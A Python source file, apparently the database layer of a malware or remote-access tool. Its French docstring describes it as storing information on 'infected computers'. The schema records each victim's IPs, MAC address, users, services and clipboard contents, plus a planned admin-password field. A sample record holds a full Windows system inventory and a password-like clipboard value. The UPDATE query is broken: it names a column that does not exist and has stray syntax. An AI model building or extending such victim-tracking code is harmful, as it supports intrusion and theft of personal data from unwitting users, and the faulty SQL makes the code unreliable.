#!/usr/bin/env python
#coding=utf-8
__author__ = "Karl Boulais"

import sqlite3
import datetime

DATABASE = 'DATABASE.db'

CREATE_CLIENTS = '''
CREATE TABLE IF NOT EXISTS clients
(
    hostname            BLOB NOT NULL,
    localIp             BLOB NOT NULL,
    publicIp            BLOB NOT NULL,
    macAddress          BLOB NOT NULL,
    users               BLOB NOT NULL,
    runningServices     BLOB NOT NULL,
    architecture        BLOB NOT NULL,
    pcInfo              BLOB,
    clipboard           BLOB,
    diskInfo            BLOB NOT NULL,
    gpuInfo             BLOB NOT NULL,
    creation_time       TEXT,
    modification_time   TEXT,
    PRIMARY KEY(hostname, localIp, publicIp, macAddress)
)
'''
DROP_CLIENT   = 'DROP TABLE IF EXISTS clients'

INSERT_CLIENT = 'INSERT INTO clients VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)'
UPDATE_CLIENT = ''' 
UPDATE clients SET 
   
users           = ?,         
runningServices = ?,
architecture    = ?,  
pcInfo          = ?,  
clipboard       = ?,  
diskInfo        = ?,  
gpuInfo         = ?,  
adminPass       = ?,

WHERE hostname = ? AND localIp = ? AND publicIp = ? AND macAddress = ?

'''

SELECT_CLIENT = 'SELECT * FROM clients'

class Dao():
    """ Base de donnée contenant les informations des ordinnateurs infectés """

    def __init__(self):
        self.db = DATABASE

    def connect(self, db):
        self.connection  = sqlite3.connect(db)
        self.cursor      = self.connection.cursor()

    def disconnect(self):
        self.cursor.close()
        self.connection.close()

    def createDb(self):
        self.cursor.execute(DROP_CLIENT)
        self.cursor.execute(CREATE_CLIENTS)
    
    def insertClient(self, data):
        self.cursor.execute(INSERT_CLIENT, data)
        self.connection.commit()

    def getAllClients(self):
        self.cursor.execute(SELECT_CLIENT)
        return self.cursor.fetchall()

    def getColumnTitle(self):
        self.cursor.execute("PRAGMA table_info(clients)")
        columnTitle = []
        for column in self.cursor.fetchall():
            columnTitle.append(column[1])
        
        return columnTitle 

        

    # TODO: Cette fonction ne va pas ici
    # Créer un lock sur le thread pour écrire dans la BD
    # def bufferInsert(self, data):
    #     buffer = list
    #     buffer.append(data)
    #     if (len(buffer) > 5): #TODO: Ajouter une contrainte de temps pour flusher le buffer
    #         self.insertClient(buffer)
    
    def creatingTuple(self, data):
        dataList = []
        for k,v in data.items():
            dataList.append(v)
        # Creation time
        dataList.append(str(datetime.datetime.now()))
        # Modification time
        dataList.append(None)
        return tuple(dataList)

    def printAllClient(self):
        for row in self.getAllClients():
            for elem in row:
                print(self.getColumnTitle()[row.index(elem)])
                print(elem, "\n")

    
    def main(self):
        self.connect(self.db)
        self.createDb()
        data = {"HOSTNAME": "psycho-PC\r\n", "LOCALIP": "10.10.10.85\r\n","PUBLICIP": "172.217.13.206\r\n",  "MAC": "D4-5D-64-D6-B8-34\r\n", "USERS": "psycho\r\n", "RUNNINGSERVICES": "\r\nName                           DisplayName                                            \r\n----                           -----------                                            \r\nAppinfo                        Application Information                                \r\nAudioEndpointBuilder           Windows Audio Endpoint Builder                         \r\nAudiosrv                       Windows Audio                                          \r\nBFE                            Base Filtering Engine                                  \r\nBrokerInfrastructure           Background Tasks Infrastructure Service                \r\nBthAvctpSvc                    AVCTP service                                          \r\nCaptureService_c7284           CaptureService_c7284                                   \r\ncbdhsvc_c7284                  Clipboard User Service_c7284                           \r\nCDPSvc                         Connected Devices Platform Service                     \r\nCDPUserSvc_c7284               Connected Devices Platform User Service_c7284          \r\nCertPropSvc                    Certificate Propagation                                \r\nClickToRunSvc                  Microsoft Office Click-to-Run Service                  \r\nCmService                      Container Manager Service                              \r\nCoreMessagingRegistrar         CoreMessaging                                          \r\nCryptSvc                       Cryptographic Services                                 \r\nDbxSvc                         DbxSvc                                                 \r\nDcomLaunch                     DCOM Server Process Launcher                           \r\nDeviceAssociationService       Device Association Service                             \r\nDhcp                           DHCP Client                                            \r\nDispBrokerDesktopSvc           Display Policy Service                                 \r\nDnscache                       DNS Client                                             \r\nDoSvc                          Delivery Optimization                                  \r\nDPS                            Diagnostic Policy Service                              \r\nDsSvc                          Data Sharing Service                                   \r\nDusmSvc                        Data Usage                                             \r\nEFS                            Encrypting File System (EFS)                           \r\nEventLog                       Windows Event Log                                      \r\nEventSystem                    COM+ Event System                                      \r\nfdPHost                        Function Discovery Provider Host                       \r\nFDResPub                       Function Discovery Resource Publication                \r\nFontCache                      Windows Font Cache Service                             \r\ngpsvc                          Group Policy Client                                    \r\nhidserv                        Human Interface Device Service                         \r\nhns                            Host Network Service                                   \r\nHvHost                         HV Host Service                                        \r\nIKEEXT                         IKE and AuthIP IPsec Keying Modules                    \r\nInstallService                 Microsoft Store Install Service                        \r\niphlpsvc                       IP Helper                                              \r\nKeyIso                         CNG Key Isolation                                      \r\nLanmanServer                   Server                                                 \r\nLanmanWorkstation              Workstation                                            \r\nlfsvc                          Geolocation Service                                    \r\nLicenseManager                 Windows License Manager Service                        \r\nlmhosts                        TCP/IP NetBIOS Helper                                  \r\nLSM                            Local Session Manager                                  \r\nLxssManager                    LxssManager                                            \r\nmpssvc                         Windows Defender Firewall                              \r\nNcbService                     Network Connection Broker                              \r\nNcdAutoSetup                   Network Connected Devices Auto-Setup                   \r\nnetprofm                       Network List Service                                   \r\nNetSetupSvc                    Network Setup Service                                  \r\nNlaSvc                         Network Location Awareness                             \r\nnsi                            Network Store Interface Service                        \r\nnvagent                        Network Virtualization Service                         \r\nNvContainerLocalSystem         NVIDIA LocalSystem Container                           \r\nNVDisplay.ContainerLocalSystem NVIDIA Display Container LS                            \r\nOneSyncSvc_c7284               Sync Host_c7284                                        \r\nPcaSvc                         Program Compatibility Assistant Service                \r\nPimIndexMaintenanceSvc_c7284   Contact Data_c7284                                     \r\nPlugPlay                       Plug and Play                                          \r\nPolicyAgent                    IPsec Policy Agent                                     \r\nPower                          Power                                                  \r\nPrintWorkflowUserSvc_c7284     PrintWorkflow_c7284                                    \r\nProfSvc                        User Profile Service                                   \r\nQWAVE                          Quality Windows Audio Video Experience                 \r\nRasMan                         Remote Access Connection Manager                       \r\nRmSvc                          Radio Management Service                               \r\nRpcEptMapper                   RPC Endpoint Mapper                                    \r\nRpcSs                          Remote Procedure Call (RPC)                            \r\nSamSs                          Security Accounts Manager                              \r\nSchedule                       Task Scheduler                                         \r\nSecurityHealthService          Windows Security Service                               \r\nSENS                           System Event Notification Service                      \r\nSessionEnv                     Remote Desktop Configuration                           \r\nSgrmBroker                     System Guard Runtime Monitor Broker                    \r\nSharedAccess                   Internet Connection Sharing (ICS)                      \r\nShellHWDetection               Shell Hardware Detection                               \r\nsmphost                        Microsoft Storage Spaces SMP                           \r\nSpooler                        Print Spooler                                          \r\nSQLWriter                      SQL Server VSS Writer                                  \r\nSSDPSRV                        SSDP Discovery                                         \r\nSstpSvc                        Secure Socket Tunneling Protocol Service               \r\nStateRepository                State Repository Service                               \r\nstisvc                         Windows Image Acquisition (WIA)                        \r\nStorSvc                        Storage Service                                        \r\nSysMain                        SysMain                                                \r\nSystemEventsBroker             System Events Broker                                   \r\nTabletInputService             Touch Keyboard and Handwriting Panel Service           \r\nTapiSrv                        Telephony                                              \r\nTermService                    Remote Desktop Services                                \r\nThemes                         Themes                                                 \r\nTimeBrokerSvc                  Time Broker                                            \r\nTokenBroker                    Web Account Manager                                    \r\nTrkWks                         Distributed Link Tracking Client                       \r\nTrustedInstaller               Windows Modules Installer                              \r\nUmRdpService                   Remote Desktop Services UserMode Port Redirector       \r\nUnistoreSvc_c7284              User Data Storage_c7284                                \r\nUserDataSvc_c7284              User Data Access_c7284                                 \r\nUserManager                    User Manager                                           \r\nUsoSvc                         Update Orchestrator Service                            \r\nVaultSvc                       Credential Manager                                     \r\nvmcompute                      Hyper-V Host Compute Service                           \r\nvmms                           Hyper-V Virtual Machine Management                     \r\nW32Time                        Windows Time                                           \r\nwampapache64                   wampapache64                                           \r\nwampmariadb64                  wampmariadb64                                          \r\nwampmysqld64                   wampmysqld64                                           \r\nWbioSrvc                       Windows Biometric Service                              \r\nWcmsvc                         Windows Connection Manager                             \r\nwcncsvc                        Windows Connect Now - Config Registrar                 \r\nWdiServiceHost                 Diagnostic Service Host                                \r\nWdiSystemHost                  Diagnostic System Host                                 \r\nWdNisSvc                       Microsoft Defender Antivirus Network Inspection Service\r\nWinDefend                      Microsoft Defender Antivirus Service                   \r\nWinHttpAutoProxySvc            WinHTTP Web Proxy Auto-Discovery Service               \r\nWinmgmt                        Windows Management Instrumentation                     \r\nWpnService                     Windows Push Notifications System Service              \r\nWpnUserService_c7284           Windows Push Notifications User Service_c7284          \r\nwscsvc                         Security Center                                        \r\nWSearch                        Windows Search                                         \r\n\r\n\r\n", "ARCH": "64-bit          \r\n", "PCINFO": "\r\n\r\nWindowsBuildLabEx                                       : 19041.1.amd64fre.vb_release.191206-1406\r\nWindowsCurrentVersion                                   : 6.3\r\nWindowsEditionId                                        : Education\r\nWindowsInstallationType                                 : Client\r\nWindowsInstallDateFromRegistry                          : 2020-12-24 7:46:11 PM\r\nWindowsProductId                                        : 00328-10000-00001-AA575\r\nWindowsProductName                                      : Windows 10 Education\r\nWindowsRegisteredOrganization                           : \r\nWindowsRegisteredOwner                                  : psycho\r\nWindowsSystemRoot                                       : C:\\Windows\r\nWindowsVersion                                          : 2009\r\nBiosCharacteristics                                     : {7, 10, 11, 12...}\r\nBiosBIOSVersion                                         : {ALASKA - 1072009, 3001, American Megatrends - 50011}\r\nBiosBuildNumber                                         : \r\nBiosCaption                                             : 3001\r\nBiosCodeSet                                             : \r\nBiosCurrentLanguage                                     : en|US|iso8859-1\r\nBiosDescription                                         : 3001\r\nBiosEmbeddedControllerMajorVersion                      : 255\r\nBiosEmbeddedControllerMinorVersion                      : 255\r\nBiosFirmwareType                                        : Uefi\r\nBiosIdentificationCode                                  : \r\nBiosInstallableLanguages                                : 9\r\nBiosInstallDate                                         : \r\nBiosLanguageEdition                                     : \r\nBiosListOfLanguages                                     : {en|US|iso8859-1, fr|FR|iso8859-1, zh|TW|unicode, zh|CN|unicode...}\r\nBiosManufacturer                                        : American Megatrends Inc.\r\nBiosName                                                : 3001\r\nBiosOtherTargetOS                                       : \r\nBiosPrimaryBIOS                                         : True\r\nBiosReleaseDate                                         : 2020-12-03 7:00:00 PM\r\nBiosSeralNumber                                         : System Serial Number\r\nBiosSMBIOSBIOSVersion                                   : 3001\r\nBiosSMBIOSMajorVersion                                  : 3\r\nBiosSMBIOSMinorVersion                                  : 3\r\nBiosSMBIOSPresent                                       : True\r\nBiosSoftwareElementState                                : Running\r\nBiosStatus                                              : OK\r\nBiosSystemBiosMajorVersion                              : 5\r\nBiosSystemBiosMinorVersion                              : 17\r\nBiosTargetOperatingSystem                               : 0\r\nBiosVersion                                             : ALASKA - 1072009\r\nCsAdminPasswordStatus                                   : Unknown\r\nCsAutomaticManagedPagefile                              : True\r\nCsAutomaticResetBootOption                              : True\r\nCsAutomaticResetCapability                              : True\r\nCsBootOptionOnLimit                                     : \r\nCsBootOptionOnWatchDog                                  : \r\nCsBootROMSupported                                      : True\r\nCsBootStatus                                            : {0, 0, 0, 0...}\r\nCsBootupState                                           : Normal boot\r\nCsCaption                                               : psycho-PC\r\nCsChassisBootupState                                    : Safe\r\nCsChassisSKUNumber                                      : Default string\r\nCsCurrentTimeZone                                       : -240\r\nCsDaylightInEffect                                      : True\r\nCsDescription                                           : AT/AT COMPATIBLE\r\nCsDNSHostName                                           : psycho-PC\r\nCsDomain                                                : WORKGROUP\r\nCsDomainRole                                            : StandaloneWorkstation\r\nCsEnableDaylightSavingsTime                             : True\r\nCsFrontPanelResetStatus                                 : Unknown\r\nCsHypervisorPresent                                     : True\r\nCsInfraredSupported                                     : False\r\nCsInitialLoadInfo                                       : \r\nCsInstallDate                                           : \r\nCsKeyboardPasswordStatus                                : Unknown\r\nCsLastLoadInfo                                          : \r\nCsManufacturer                                          : System manufacturer\r\nCsModel                                                 : System Product Name\r\nCsName                                                  : psycho-PC\r\nCsNetworkAdapters                                       : {Ethernet 3, vEthernet (Default Switch), vEthernet (Ethernet 3), vEthernet (WSL)}\r\nCsNetworkServerModeEnabled                              : True\r\nCsNumberOfLogicalProcessors                             : 12\r\nCsNumberOfProcessors                                    : 1\r\nCsProcessors                                            : {AMD Ryzen 5 2600 Six-Core Processor            }\r\nCsOEMStringArray                                        : {Default string, Default string, HAWAII, Default string...}\r\nCsPartOfDomain                                          : False\r\nCsPauseAfterReset                                       : -1\r\nCsPCSystemType                                          : Desktop\r\nCsPCSystemTypeEx                                        : Desktop\r\nCsPowerManagementCapabilities                           : \r\nCsPowerManagementSupported                              : \r\nCsPowerOnPasswordStatus                                 : Unknown\r\nCsPowerState                                            : Unknown\r\nCsPowerSupplyState                                      : Safe\r\nCsPrimaryOwnerContact                                   : \r\nCsPrimaryOwnerName                                      : psycho\r\nCsResetCapability                                       : Other\r\nCsResetCount                                            : -1\r\nCsResetLimit                                            : -1\r\nCsRoles                                                 : {LM_Workstation, LM_Server, NT}\r\nCsStatus                                                : OK\r\nCsSupportContactDescription                             : \r\nCsSystemFamily                                          : To be filled by O.E.M.\r\nCsSystemSKUNumber                                       : SKU\r\nCsSystemType                                            : x64-based PC\r\nCsThermalState                                          : Safe\r\nCsTotalPhysicalMemory                                   : 34271875072\r\nCsPhyicallyInstalledMemory                              : 33554432\r\nCsUserName                                              : psycho-PC\\psycho\r\nCsWakeUpType                                            : PowerSwitch\r\nCsWorkgroup                                             : WORKGROUP\r\nOsName                                                  : Microsoft Windows 10 Education\r\nOsType                                                  : WINNT\r\nOsOperatingSystemSKU                                    : 121\r\nOsVersion                                               : 10.0.19042\r\nOsCSDVersion                                            : \r\nOsBuildNumber                                           : 19042\r\nOsHotFixes                                              : {KB4601554, KB4562830, KB4570334, KB4580325...}\r\nOsBootDevice                                            : \\Device\\HarddiskVolume1\r\nOsSystemDevice                                          : \\Device\\HarddiskVolume3\r\nOsSystemDirectory                                       : C:\\Windows\\system32\r\nOsSystemDrive                                           : C:\r\nOsWindowsDirectory                                      : C:\\Windows\r\nOsCountryCode                                           : 1\r\nOsCurrentTimeZone                                       : -240\r\nOsLocaleID                                              : 0409\r\nOsLocale                                                : en-US\r\nOsLocalDateTime                                         : 2021-05-29 8:45:37 PM\r\nOsLastBootUpTime                                        : 2021-05-26 2:53:59 PM\r\nOsUptime                                                : 3.05:51:37.8806456\r\nOsBuildType                                             : Multiprocessor Free\r\nOsCodeSet                                               : 1252\r\nOsDataExecutionPreventionAvailable                      : True\r\nOsDataExecutionPrevention32BitApplications              : True\r\nOsDataExecutionPreventionDrivers                        : True\r\nOsDataExecutionPreventionSupportPolicy                  : OptIn\r\nOsDebug                                                 : False\r\nOsDistributed                                           : False\r\nOsEncryptionLevel                                       : 256\r\nOsForegroundApplicationBoost                            : Maximum\r\nOsTotalVisibleMemorySize                                : 33468628\r\nOsFreePhysicalMemory                                    : 16744664\r\nOsTotalVirtualMemorySize                                : 38973652\r\nOsFreeVirtualMemory                                     : 5219004\r\nOsInUseVirtualMemory                                    : 33754648\r\nOsTotalSwapSpaceSize                                    : \r\nOsSizeStoredInPagingFiles                               : 5505024\r\nOsFreeSpaceInPagingFiles                                : 4792872\r\nOsPagingFiles                                           : {C:\\pagefile.sys}\r\nOsHardwareAbstractionLayer                              : 10.0.19041.964\r\nOsInstallDate                                           : 2020-12-24 2:46:11 PM\r\nOsManufacturer                                          : Microsoft Corporation\r\nOsMaxNumberOfProcesses                                  : 4294967295\r\nOsMaxProcessMemorySize                                  : 137438953344\r\nOsMuiLanguages                                          : {en-US}\r\nOsNumberOfLicensedUsers                                 : \r\nOsNumberOfProcesses                                     : 325\r\nOsNumberOfUsers                                         : 2\r\nOsOrganization                                          : \r\nOsArchitecture                                          : 64-bit\r\nOsLanguage                                              : en-US\r\nOsProductSuites                                         : {TerminalServicesSingleSession}\r\nOsOtherTypeDescription                                  : \r\nOsPAEEnabled                                            : \r\nOsPortableOperatingSystem                               : False\r\nOsPrimary                                               : True\r\nOsProductType                                           : WorkStation\r\nOsRegisteredUser                                        : psycho\r\nOsSerialNumber                                          : 00328-10000-00001-AA575\r\nOsServicePackMajorVersion                               : 0\r\nOsServicePackMinorVersion                               : 0\r\nOsStatus                                                : OK\r\nOsSuites                                                : {TerminalServices, TerminalServicesSingleSession}\r\nOsServerLevel                                           : \r\nKeyboardLayout                                          : 00011009\r\nTimeZone                                                : (UTC-05:00) Eastern Time (US & Canada)\r\nLogonServer                                             : \\\\psycho-PC\r\nPowerPlatformRole                                       : Desktop\r\nHyperVisorPresent                                       : True\r\nHyperVRequirementDataExecutionPreventionAvailable       : \r\nHyperVRequirementSecondLevelAddressTranslation          : \r\nHyperVRequirementVirtualizationFirmwareEnabled          : \r\nHyperVRequirementVMMonitorModeExtensions                : \r\nDeviceGuardSmartStatus                                  : Off\r\nDeviceGuardRequiredSecurityProperties                   : {0}\r\nDeviceGuardAvailableSecurityProperties                  : {BaseVirtualizationSupport, DMAProtection}\r\nDeviceGuardSecurityServicesConfigured                   : {0}\r\nDeviceGuardSecurityServicesRunning                      : {0}\r\nDeviceGuardCodeIntegrityPolicyEnforcementStatus         : \r\nDeviceGuardUserModeCodeIntegrityPolicyEnforcementStatus : \r\n\r\n\r\n\r\n", "CLIPBOARD": "Motdepassesupersecret", "DISKS": "\r\n\r\nFriendlyName   : ADATA SX8200PNP\r\nSerialNumber   : 2K4229Q256RA        _00000001.\r\nPartitionStyle : GPT\r\nSize, Gb       : 1908\r\n\r\n\r\n\r\n", "GPU": "\r\n\r\nVideoProcessor       : NVIDIA GeForce GTX 1070 Ti\r\nVideoModeDescription : 2560 x 1440 x 4294967296 colors\r\nStatus               : OK\r\nDriverVersion        : 27.21.14.6589\r\nDriverDate           : 20210325000000.000000-000\r\nPNPDeviceID          : PCI\\VEN_10DE&DEV_1B82&SUBSYS_244519DA&REV_A1\\4&1DA95F35&0&0019\r\n\r\n\r\n\r\n"}
        self.insertClient(self.creatingTuple(data))

        self.printAllClient()

    
if __name__ == "__main__":
    Dao().main()


